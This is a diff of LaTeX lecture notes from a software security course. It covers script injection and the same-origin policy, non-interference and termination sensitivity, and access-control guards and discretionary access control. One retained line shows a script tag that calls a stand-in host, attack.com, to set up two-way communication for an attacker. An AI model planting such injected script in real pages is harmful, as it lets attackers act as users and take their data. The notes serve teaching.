@@ -634,8 +634,7 @@ Even if the SOP policy is forbidding you to look at responses (which it does), y
 <script src="http://attack.com?<parameters>></script>\\
 The browser will send a request to attack.com. attack.com wants to send back information to the script. You can have it return something like
 Process(<response>) $\rightarrow$ function call.\\
-%The script that the attacker has injected (30.30). 
-The attacker can then do two-way communication.\\
+The script that the attacker has injected gives him the ability to choose the URL and add parameters. attack.com sends back a process function call and two-way communication is set up. The attacker can then do two-way communication.\\
 This was a flaw in the SOP, but it was very useful. It's now thought of as a development technique (Google Maps): Google sends scripts and does bidirectional communication with the shown script). This way you can create mashup application. This vulnerability has become a feature, but it makes a risk a a bit higher. 
 
 \paragraph{Slide 57:} Once you have this, you can do whatever you want (whatever the user can do on good.com, you can do). This kind of script injection is a very devastating attack. 
@@ -688,35 +687,50 @@ Program 4:
 while(h>0) do ; //do nothing
 send(1)
 \end{verbatim}
-$\rightarrow$ If you say "producing outputs can take an arbitrary amount of time", then an attacker will never be able to compare the two runs. If the attacker sends 2 inputs, the attacker might see a 1 in one case and wait indefinitely in the other case, so he can never draw the definite conclusion that h is positive. If he sees 1, he knows h is negative, otherwise he doesn't know anything. \\ %TODO tot hier
-The variant that makes it bad is termination sensitive. Termination insensitive is only bad if you have 2 (57.00).
-Slide 73: For low level security we were pretty complete, for web security, there are many issues that haven't been covered. 
+$\rightarrow$ If you say "producing outputs can take an arbitrary amount of time", then an attacker will never be able to compare the two runs. If the attacker sends 2 inputs, the attacker might see a 1 in one case and wait indefinitely in the other case, so he can never draw the definite conclusion that h is positive. If he sees 1, he knows h is negative, otherwise he doesn't know anything. \\ 
+You can think of this as leaking half a bit instead of one bit. Again there are two variants of the definition: one variant makes it bad and one variant makes it good.
+The variant that makes it bad is termination sensitive non-interference. Termination insensitive non-interference is only bad if you have two completely terminated sequences that show a different output.
 
-Slides: 4
+\paragraph{Slide 73:} For low level security we were pretty complete, for web security there are many issues that haven't been covered. 
 
-Slide 1: Now it's less platform-specific. What kind of security requirements do we have for our applications? In all the examples we'll see, you'll have different users with different access rights. Who is doing something with the application determines what that person can do with the application. Building acces-control into the application needs to be done regularly.
+\section{Slides: 4. AccessControl(1)}
+
+\paragraph{Slide 1:} Now it's less platform-specific. What kind of security requirements do we have for our applications? In all the examples we'll see, you'll have different users with different access rights. Who is doing something with the application determines what that person can do with the application. Building access-control into the application needs to be done regularly.\\
 How do you build access control into your application in a structured, consistent way?
-Slide 2: Originally Lampson's model was important for OS's and servers. Today it's important in many applications (they are servers). Some of the terminology and examples used are about OS's. We'll lok at desgin patterns for access policies. We should be able to make decisions on whether they're a good patterns for the application you're designing. 
-Slide 3: Whenever you have a SW system that manages assets (pictures, shopping basket,…) that we value and where multiple principals can do actions on the system. We use the term principals because different users will do actions on the principles. In general, we'll use it for an entity that can perform actions on the system and we want to impose rules for what the principal can do with the application. The actions you can do on the system are DOM API calls and the third-party script is the principal (to compare with web security). 
-It looks simple, but it's extremely widely applicable.
-We ave principals doing actions on the protrected system. Now we need a guard, seomthing in the middle, that can intercept any action that's done on the system and that can decide whether an action can be done on the system. In general, the problem is split into 2 parts: what you cn do to a system often depends on who you are. You have to authenticate and once the guard knows who you are, the guard needs to check if you are authorized to do the action you want to perform. 
-Conceptually, it looks very simple, but it's not trivial, because there ar emany corner cases.
-Slide 4: Examples 
-Slide 5: We study this because almost all applications today need these access checks. Access control on FB is more complex than access control on your file system. This is one of the reasons why we want to study this.
-Slide 6: We'll make assumptions about the guard: it should look at actions and decide whether they can pass or not. They have to maintain state. It will need to remember a bit about the system. Almost all access control systems that we lok at, will remember some part of the past. Stateless firewalls don't do this for examples, but most access control in applications will need to maintain some kind of state. The guard needs a state to make decisions. If you do access control based on state, but if there's no access control to change that state, tehn there's a leak. 
-We'll think about guards that can only decide to pass or drop an action. You could actualise this. You coul dhav e a guard with modifying an action (show a windows before showing the info). We won't consider the alternatives. We'll focus on pass/drop guards.
-The guard makes a decision and may change state. On handling an action, the guard will read and write the state.
-If you think of it abstractly, you can think of them as state machines: set of states that can transition based on inputs. A guard can be modelled as a state machine where in a certain state, for a given input action, the guard can transition if it is in a certain state. 
-Slide 7: Example: Suppose we have a protected system that has send() and read() as actions and it has a guard that intercepts that intercepts any kind of send() or read() that (? Can do 1.17.00). The guard can have 2 states per principal: S0 is theinitial state of the guard where both actions are allowed. As soon as you read something, the state changes (when sending, you stay in S0). Then sending is no longer allowed, but reading is still allowed. The general behaviour of a guard that can maintain state and can pass/drop decisions, can be modelled like a state machine. (1.19.00). We'll create it program-like: boolean to maintain state. Specify preconditions and effects of actions. The precondition specifies whether an action is allowed to happen or not. What the new state will go to is specified in the body. The code is much more scalable than the state machine. Even though it looks like code, we have to look at it as a specification. It's an executable specification. 
-Slide 8: Each of the design patterns for AC will be illustrated with automata (1.23.00). It's a very concrete way of specifying policies. Exploring alternatives of policies can be interesting. 
-Slide 9: Sources of confusion.
-	• Policy vs mechanism: policy specifies what you want to enforce and the mechanism will specify how you will enforce it. This is somewhat imprecise. You can have a very high-level policy (e.g. user info must be private (what you want). You might implement that with a state machine like we saw (mechanism). If you look at it in this way, it's clear. But if you think about the guard and how to configure it, then the state machine is what you want the guard to enforce. Then the state machine would be the policy and the way you implement it would be the mechanism. It depends on the level of abstraction. in the lecutre: policy: what the guard needs to enforce, the specifiation of that.
-	• Discretionary vs mandatory: not discussed now.
-Slide 10: access control model: policy: what can happen in what state. Model: something that's not really defined: class of policies that look similar: design pattern for access control policy. It's not well-defined, so we'll not use the term too much. 
-Slide 12: The objective of DAC: we want creator-controlled sharing of information. You have many users that can contribute info to the system. They put items in their wishlist, posts,… they create potentially interesting objects of information in the system. DAC says that what we want to enforce that whoever creates an object can decide what happens to that object. We assume that we have a number of objects and operations that users can perform on these objects. DAC adds that we will associate with very object an owner, who created the object. Tehre are variants that have other notions of 'ownér. We want that the owner can grant other users the rigth to do operations on the object.
-Variants:
-	• Pass ownership: suppose I create soething, should it be possible for me to pass ownership? In some systems you may want this, in others you may not.
-	• Delegation: the owner, the creator, can make decisions. Should it be possible for him to delegate these rights (and stay owner)? When you have delegation, can revoke the right to manage the objects? If you want revocation, what does it mean? These are all decisions that have a serious impact on the security of the system.
 
+\paragraph{Slide 2:} Originally Lampson's model was important for OS's and servers. Today it's important in many applications (they are servers). Some of the terminology and examples used are about OS's. We'll look at design patterns for access policies. We should be able to make decisions on whether they're a good patterns for the application you're designing. 
+
+\paragraph{Slide 3:} Whenever you have a software system that manages assets (pictures, shopping basket,…) that we value and where multiple principals can do actions on the system, we need access control. We use the term principals because different users will do actions on the principals. In general, we'll use it for an entity that can perform actions on the system and we want to impose rules for what the principal can do with the application. The actions you can do on the system are DOM API calls and the third-party script is the principal (to compare with web security). \\
+It looks simple, but it's extremely widely applicable.\\
+We have principals doing actions on the protected system. Now we need a guard, something in the middle, that can intercept any action that's done on the system and that can decide whether an action can be done on the system. In general, the problem is split into 2 parts: what you can do to a system often depends on who you are. You have to authenticate and once the guard knows who you are, the guard needs to check if you are authorized to do the action you want to perform.\\ 
+Conceptually, it looks very simple, but it's not trivial, because there are many corner cases.
+
+\paragraph{Slide 4:} Examples.
+
+\paragraph{Slide 5:} We study this because almost all applications today need these access checks. Access control on Facebook is more complex than access control on your file system. This is one of the reasons why we want to study this.
+
+\paragraph{Slide 6:} We'll make assumptions about the guard: it should look at actions and decide whether they can pass or not. They have to maintain state. It will need to remember a bit about the system. Almost all access control systems that we look at will remember some part of the past. Stateless firewalls don't do this for examples, but most access control in applications will need to maintain some kind of state. The guard needs a state to make decisions. If you do access control based on state, but if there's no access control to change that state, then there's a leak. \\
+We'll think about guards that can only decide to pass or drop an action. You could actualise this. You could have a guard with modifying an action (show a windows before showing the info). We won't consider the alternatives. We'll focus on pass/drop guards.\\
+The guard makes a decision and may change state. On handling an action, the guard will read and write the state.\\
+If you think of it abstractly, you can think of them as state machines: set of states that can transition based on inputs. A guard can be modelled as a state machine where in a certain state, for a given input action, the guard can transition if it is in a certain state. 
+
+\paragraph{Slide 7:} Example: Suppose we have a protected system that has send() and read() as actions and it has a guard that intercepts any kind of send() or read() that a person can do. We want that you can do both sending and reading, but as soon as you have read something, you can no longer send. The guard can have 2 states per principal: S0 is the initial state of the guard where both actions are allowed. As soon as you read something, the state changes (when sending, you stay in S0). Then sending is no longer allowed, but reading is still allowed. The general behaviour of a guard that can maintain state and can make pass/drop decisions, can be modelled like a state machine. We'll create it program-like: boolean to maintain state. Specify preconditions and effects of actions. The precondition specifies whether an action is allowed to happen or not. What the new state will go to is specified in the body. The code is much more scalable than the state machine. Even though it looks like code, we have to look at it as a specification. It's an executable specification. 
+
+\paragraph{Slide 8:} Each of the design patterns for access control will be illustrated with automata that implement these access control protocols. It's a very concrete way of specifying policies. Exploring alternatives of policies can be interesting. 
+
+\paragraph{Slide 9:} Sources of confusion.
+\begin{itemize}
+\item Policy vs. mechanism: policy specifies what you want to enforce and the mechanism will specify how you will enforce it. This is somewhat imprecise. You can have a very high-level policy (e.g. user info must be private (what you want). You might implement that with a state machine like we saw (mechanism). If you look at it in this way, it's clear. But if you think about the guard and how to configure it, then the state machine is what you want the guard to enforce. Then the state machine would be the policy and the way you implement it would be the mechanism. It depends on the level of abstraction. In the lecture: policy: what the guard needs to enforce. Configuration of the guard: automaton, the specification of that.
+\item Discretionary vs. mandatory: not discussed now.
+\end{itemize}
+
+\paragraph{Slide 10:} Access control model: policy: what can happen in what state. Model: something that's not really defined: class of policies that look similar: design pattern for access control policy. It's not well-defined, so we'll not use the term too much. 
+
+\paragraph{Slide 12:} The objective of DAC: we want creator-controlled sharing of information. You have many users that can contribute info to the system. They put items in their wishlist, posts,… They create potentially interesting objects of information in the system. DAC says that what we want to enforce is that whoever creates an object can decide what happens to that object. We assume that we have a number of objects and operations that users can perform on these objects. DAC adds that we will associate with very object an owner, who created the object. There are variants that have other notions of `owner'. We want that the owner can grant other users the right to do operations on the object.\\
+Variants:
+\begin{itemize}
+\item Pass ownership: suppose I create something, should it be possible for me to pass ownership? In some systems you may want this, in others you may not.
+\item Delegation: the owner, the creator, can make decisions. Should it be possible for him to delegate these rights (and stay owner)? When you have delegation, can you revoke the right to manage the objects? If you want revocation, what does it mean? These are all decisions that have a serious impact on the security of the system.
+\end{itemize}
 
 \end{document}
